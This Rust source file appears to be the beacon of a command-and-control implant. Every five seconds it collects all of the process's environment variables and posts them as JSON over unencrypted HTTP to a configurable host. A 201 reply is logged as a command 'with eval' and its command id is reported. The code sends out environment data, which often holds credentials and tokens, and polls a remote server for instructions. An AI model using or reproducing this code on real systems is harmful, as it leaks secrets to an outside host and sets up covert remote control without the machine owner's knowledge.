use minreq::post;
use serde_json::json;
use std::{collections::HashMap, env, io::Result};
use tokio::{sync::mpsc::UnboundedSender, time};

const PROTO: &str = "http";
const PULSE_INTERVAL: u64 = 5;

pub(crate) fn init(tx: UnboundedSender<String>, host: String) {
    println!("[{}] {}", "pulse", "init");
    tx.send("PULSE.init".to_string()).unwrap();
    tokio::spawn(async move { send_pulse_async(tx, host, PULSE_INTERVAL).await });
}

async fn send_pulse_async(
    tx: UnboundedSender<String>,
    host: String,
    interval_seconds: u64,
) -> Result<()> {
    println!("[{}] {}", "pulse", "run");

    let mut interval = time::interval(time::Duration::from_secs(interval_seconds));

    loop {
        tx.send("PULSE.STARTED".to_string()).unwrap();

        let payload_env: HashMap<String, String> = env::vars().collect();
        let payload = json!(payload_env).to_string();
        let send_request = post(format!("{}://{}/pulse", PROTO, host).to_owned())
            .with_header("Content-Type", "application/json")
            .with_body(payload)
            .send();

        if send_request.is_err() {
            println!("[{}] {}", "pulse", "failed - will retry");
            tx.send("PULSE.FAILED".to_string()).unwrap();
        } else {
            let response = send_request.unwrap();

            print!("[{}] {} {}", "pulse", "sent", response.status_code);

            match response.status_code {
                204 => {
                    println!("- ok");
                    tx.send("PULSE.OK".to_string()).unwrap();
                }
                201 => {
                    let data = response.as_str().unwrap();
                    let cid = response.headers["cid"].as_str();
                    println!("- with eval: ({}) {}", cid, data);
                    tx.send("PULSE.COMMAND".to_string()).unwrap();
                }
                _ => {
                    println!("- with error: {}", response.reason_phrase);
                    tx.send("PULSE.ERROR".to_string()).unwrap();
                }
            }
        }

        interval.tick().await;
    }
}
